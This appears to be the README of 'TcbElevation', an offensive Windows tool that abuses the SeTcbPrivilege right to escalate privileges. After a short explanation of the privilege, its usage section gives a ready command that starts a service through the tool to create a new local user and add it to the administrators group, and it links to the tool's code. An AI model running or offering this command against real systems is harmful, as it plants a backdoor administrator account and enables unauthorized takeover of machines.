# TcbElevation

SeTcbPrivilege, known as "Act as part of the operating system," is a security privilege in Windows operating systems. This privilege grants an account the ability to authenticate like any user and thus impersonate any user without authentication. Essentially, it allows a process to perform actions or access resources by impersonating any user, without needing their credentials. This is a highly sensitive privilege because it effectively allows bypassing security checks, making it a target for attackers who seek to elevate privileges or perform actions stealthily.

Due to its powerful nature, SeTcbPrivilege is typically reserved for critical system processes and is not granted to standard user accounts. In secure environments, it's essential to monitor and control which accounts have this privilege to mitigate potential security risks. Misuse of this privilege can lead to significant security vulnerabilities, allowing attackers to escalate their privileges on a system or network undetected.

# Usage

## Simple example:
```powershell
.\TcbElevation.exe <name of the service> "C:\Windows\System32\cmd.exe /c net user <user> <password> /add && net localgroup administrators <user> /add"

Error starting service 1053
```
Please note: "Error starting service 1053" is expected


# Sources
The code comes from:
https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178

More info:
https://pentest.party/notes/windows/privilege-tcb
